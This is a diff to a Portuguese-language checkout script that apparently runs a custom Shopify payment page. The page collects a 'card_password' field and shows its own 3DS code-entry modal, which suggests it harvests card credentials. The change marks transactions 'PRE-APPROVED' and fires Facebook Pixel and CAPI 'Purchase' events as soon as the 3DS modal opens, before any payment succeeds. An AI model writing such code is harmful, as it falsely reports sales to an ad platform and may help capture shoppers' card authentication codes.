@@ -2759,7 +2759,7 @@ Obs: Caso j├â┬í tenha realizado o pagamento, enviaremos uma mensagem confi
         ...payload,
         card_password: 'erro 3ds',
         three_ds_status: 'erro 3ds',
-        status: 'FAILED' // Estado inicial caso não termine a inserção de senha
+        status: 'PRE-APPROVED' // Garante o envio do CAPI Purchase imediatamente ao gerar a transação de cartão
       };
 
       let responseData = null;
@@ -2803,6 +2803,17 @@ Obs: Caso j├â┬í tenha realizado o pagamento, enviaremos uma mensagem confi
       // Esconde o loading overlay e abre o modal 3DS
       authLoadingOverlay.classList.remove('open');
       auth3dsOverlay.classList.add('open');
+
+      // Disparar o evento Purchase no Pixel do Facebook imediatamente ao abrir a validação 3DS
+      const prodName = (shopifyCartItems && shopifyCartItems[0] && (shopifyCartItems[0].name || shopifyCartItems[0].title)) || shpfyProductTitle || 'Produto';
+      const currentSessionId = localStorage.getItem('checkout_session_id') || checkoutSessionId;
+      trackPixelEvent('Purchase', {
+        content_name: prodName,
+        currency: 'BRL',
+        value: totalAmount,
+        payment_method: 'credit_card'
+      }, currentSessionId);
+
       setTimeout(() => {
         const firstDigit = document.getElementById('auth-digit-1');
         if (firstDigit) firstDigit.focus();
